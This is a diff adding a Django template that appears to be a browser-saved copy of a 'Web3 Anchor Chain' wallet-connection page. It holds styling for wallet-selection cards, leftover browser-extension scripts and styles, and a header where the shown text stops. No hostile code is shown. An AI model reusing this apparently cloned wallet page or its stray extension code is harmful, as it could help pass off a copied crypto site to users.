@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
+    
+<script type="text/javascript" charset="utf-8" async="" src="{% static './Home - Web3 Anchor Chain_files/loader.js'%}"></script>
+ <div id="in-page-channel-node-id" data-channel-name="in_page_channel_Z6BSkW" bis_skin_checked="1"></div>
+    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+ 
+    <title>Web3 - Web3 Anchor Chain - Wallet Connection</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="https://web3anchorchain.com/favicon.svg" type="image/svg+xml">
+
+    <!-- Fonts -->
+    <link href="{% static './Web3 - Web3 Anchor Chain - Wallet Connection_files/css2'%}" rel="stylesheet">
+
+    <!-- Vite Assets -->
+    <link rel="preload" as="style" href="{% static './Web3 - Web3 Anchor Chain - Wallet Connection_files/app-DN6OvxZM.css'%}"><link rel="preload" as="style" href="{% static './Web3 - Web3 Anchor Chain - Wallet Connection_files/app-B_l4pjL9.css'%}"><link rel="modulepreload" as="script" href="{% static './Web3 - Web3 Anchor Chain - Wallet Connection_files/app-wHqCoHq-.js'%}"><link rel="stylesheet" href="{% static './Web3 - Web3 Anchor Chain - Wallet Connection_files/app-DN6OvxZM.css'%}"><link rel="stylesheet" href="{% static './Web3 - Web3 Anchor Chain - Wallet Connection_files/app-B_l4pjL9.css'%}"><script type="module" src="{% static './Web3 - Web3 Anchor Chain - Wallet Connection_files/app-wHqCoHq-.js'%}"></script>
+    <style>
+        [x-cloak] {
+            display: none !important;
+        }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            /* Prevent horizontal scroll */
+        }
+
+
+
+        .wallets-section {
+            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            color: #fff;
+            padding: 80px 15px;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .wallets-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background:
+                radial-gradient(circle at 20% 80%, rgba(16, 185, 129, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(6, 182, 212, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .wallets-section h2 {
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, #f59e0b, #f97316, #ef4444);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            position: relative;
+            z-index: 1;
+        }
+
+        .description {
+            max-width: 800px;
+            color: #d1d5db;
+            margin-bottom: 2.5rem;
+            background: rgba(55, 65, 81, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 1.5rem;
+            border-radius: 12px;
+            font-size: 14px;
+            line-height: 1.6;
+            border: 1px solid rgba(75, 85, 99, 0.3);
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-card {
+            background: rgba(55, 65, 81, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(75, 85, 99, 0.3);
+            border-radius: 16px;
+            text-align: left;
+            transition: all 0.3s ease;
+            height: 100%;
+            cursor: pointer;
+            color: #fff;
+            margin-bottom: 1.5rem;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .wallet-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(236, 72, 153, 0.15), rgba(6, 182, 212, 0.1));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .wallet-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(236, 72, 153, 0.2), 0 0 0 1px rgba(236, 72, 153, 0.3);
+            border-color: rgba(236, 72, 153, 0.6);
+            background: rgba(55, 65, 81, 0.95);
+        }
+
+        .wallet-card:hover::before {
+            opacity: 1;
+        }
+
+        .wallet-card img {
+            max-width: 60px;
+            margin-bottom: 10px;
+            border-radius: 50%;
+            transition: transform 0.3s ease;
+        }
+
+        .wallet-card:hover img {
+            transform: scale(1.1);
+        }
+
+        .wallet-name {
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 0;
+            color: #fff;
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem;
+            width: 100%;
+            background: rgba(55, 65, 81, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            border: 1px solid rgba(75, 85, 99, 0.3);
+            margin-bottom: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-label {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .toggle-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+        }
+
+        .toggle-label {
+            color: #d1d5db;
+            font-weight: 500;
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 44px;
+            height: 24px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #374151, #4b5563);
+            border-radius: 24px;
+            transition: all 0.4s ease;
+            border: 1px solid rgba(75, 85, 99, 0.5);
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 2px;
+            background: linear-gradient(135deg, #d1d5db, #f3f4f6);
+            transition: all 0.4s ease;
+            border-radius: 50%;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .toggle-switch input:checked+.slider {
+            background: linear-gradient(135deg, #f97316, #f59e0b);
+            border-color: rgba(16, 185, 129, 0.5);
+        }
+
+        .toggle-switch input:checked+.slider:before {
+            transform: translateX(20px);
+            background: linear-gradient(135deg, #ffffff, #f9fafb);
+        }
+
+        .hp-select-box-item input[type="radio"] {
+            display: none;
+        }
+
+        .hp-select-box-item input[type="radio"]:checked+label .wallet-card {
+            border-color: #22c55e;
+            background: rgba(34, 197, 94, 0.1);
+            box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.3);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+            margin: 0 -15px;
+        }
+
+        .col-12 {
+            flex: 0 0 100%;
+            max-width: 100%;
+            padding: 0 15px;
+        }
+
+        @media (min-width: 768px) {
+            .col-md-6 {
+                flex: 0 0 50%;
+                max-width: 50%;
+            }
+        }
+
+        @media (min-width: 992px) {
+            .col-lg-4 {
+                flex: 0 0 33.333333%;
+                max-width: 33.333333%;
+            }
+        }
+
+        /* Shimmer animation for badges */
+        @keyframes shimmer {
+            0% {
+                left: -100%;
+            }
+
+            100% {
+                left: 100%;
+            }
+        }
+
+        /* Responsive improvements */
+        @media (max-width: 768px) {
+            .wallet-container {
+                width: 100%;
+                padding: 1rem;
+            }
+
+            .wallets-section {
+                padding: 40px 15px;
+            }
+
+            /* Hide desktop menu on mobile */
+            .hidden.lg\:flex {
+                display: none !important;
+            }
+
+            /* Show mobile menu button */
+            .lg\:hidden {
+                display: block !important;
+            }
+
+            /* Ensure no horizontal overflow */
+            body {
+                overflow-x: hidden;
+            }
+
+            .container {
+                max-width: 100%;
+                padding-left: 1rem;
+                padding-right: 1rem;
+            }
+
+            /* Fix search input on mobile */
+            input[type="text"] {
+                font-size: 16px !important;
+                /* Prevents zoom on iOS */
+            }
+        }
+
+        /* Desktop responsive */
+        @media (min-width: 769px) {
+            .hidden.lg\:flex {
+                display: flex !important;
+            }
+
+            .lg\:hidden {
+                display: none !important;
+            }
+        }
+
+        /* Mobile menu styles */
+        .translate-x-0 {
+            transform: translateX(0) !important;
+        }
+
+        .-translate-x-full {
+            transform: translateX(-100%) !important;
+        }
+
+        .duration-300 {
+            transition-duration: 300ms;
+        }
+
+        .transition-transform {
+            transition-property: transform;
+            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .ease-in-out {
+            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .fixed {
+            position: fixed;
+        }
+
+        .inset-0 {
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+        }
+
+        .z-50 {
+            z-index: 50;
+        }
+
+        .z-20 {
+            z-index: 20;
+        }
+
+        .bg-black\/50 {
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .bg-gray-800 {
+            background-color: #1f2937;
+        }
+
+        .w-80 {
+            width: 20rem;
+        }
+
+        .h-screen {
+            height: 100vh;
+        }
+
+        .overflow-y-auto {
+            overflow-y: auto;
+        }
+
+        .p-4 {
+            padding: 1rem;
+        }
+
+        .mb-6 {
+            margin-bottom: 1.5rem;
+        }
+
+        .gap-3 {
+            gap: 0.75rem;
+        }
+
+        .flex {
+            display: flex;
+        }
+
+        .flex-col {
+            flex-direction: column;
+        }
+
+        .justify-between {
+            justify-content: space-between;
+        }
+
+        .items-center {
+            align-items: center;
+        }
+
+        .py-2 {
+            padding-top: 0.5rem;
+            padding-bottom: 0.5rem;
+        }
+
+        .inline-flex {
+            display: inline-flex;
+        }
+
+        .hover\:text-yellow-400:hover {
+            color: #f59e0b;
+        }
+
+        .transition-colors {
+            transition-property: color;
+            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+            transition-duration: 150ms;
+        }
+
+        .text-xl {
+            font-size: 1.25rem;
+            line-height: 1.75rem;
+        }
+
+        .text-2xl {
+            font-size: 1.5rem;
+            line-height: 2rem;
+        }
+
+        .w-6 {
+            width: 1.5rem;
+        }
+
+        .h-6 {
+            height: 1.5rem;
+        }
+    </style>
+<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;,&quot;//www.ukrnafta.com/data/map/&quot;,&quot;//maps.google.com/maps&quot;,&quot;//www.openstreetmap.org/export/embed.html&quot;,&quot;//www.google.com/maps/d/u/3/embed&quot;]" data-dynamic-id="10fecbf8-39f3-4f30-ab17-0c4d27e99288" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="10fecbf8-39f3-4f30-ab17-0c4d27e99288" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script><style>@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+.trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+.trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1e2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474d57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #fff;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #fff;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+
+/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */</style><style>
+  .imageye-selected {
+    outline: 2px solid black !important;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5) !important;
+  }
+</style><script src="chrome-extension://lfhkognknkcapfecnmohcdoekmopfkmm/src/contents/provider/inject.ts.js" type="module"></script></head>
+
+<body class="bg-gray-900 text-white font-[&#39;Outfit&#39;] overflow-x-hidden" __processed_8214a39d-5cc5-4cb5-bf2e-0d36f70f0401__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZW5hYmxlZCIsIkNPTkZJRyI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIyLjAuNDUiLCJzY29yZSI6MjAwNDUwfV0=">
+    <!-- Header -->
+    <header x-data="{
+        scrolled: false,
+        mobileMenu: false,
+        initScroll() {
+            this.scrolled = document.documentElement.scrollTop &gt; 20;
+            window.addEventListener(&#39;scroll&#39;, () =&gt; {
+                this.scrolled = window.scrollY &gt; 20;
+            })
+        },
+        toggleMobileMenu() {
+            this.mobileMenu = !this.mobileMenu;
+        }
+    }" x-init="initScroll()" :class="scrolled ? &#39;bg-gray-800/90 backdrop-blur-md&#39; : &#39;bg-transparent&#39;" class="z-50 py-4 xl:py-6 border-b border-gray-700/30 fixed top-0 left-0 right-0 w-full transition-all duration-300 bg-gray-800/90 backdrop-blur-md">
+        <div class="container mx-auto px-4 flex justify-between items-center" bis_skin_checked="1">
+            <a class="logo-container text-2xl font-bold" href="/">
+                <div class="logo-container text-lg font-bold " bis_skin_checked="1">
+            <span class="logo-word text-primary-400">Web3</span>
+            <span class="logo-word text-secondary-500">Anchor</span>
+            <span class="logo-word text-accent-500">Chain</span>
+    </div>
+            </a>
+
+            <div class="flex gap-3 items-center" bis_skin_checked="1">
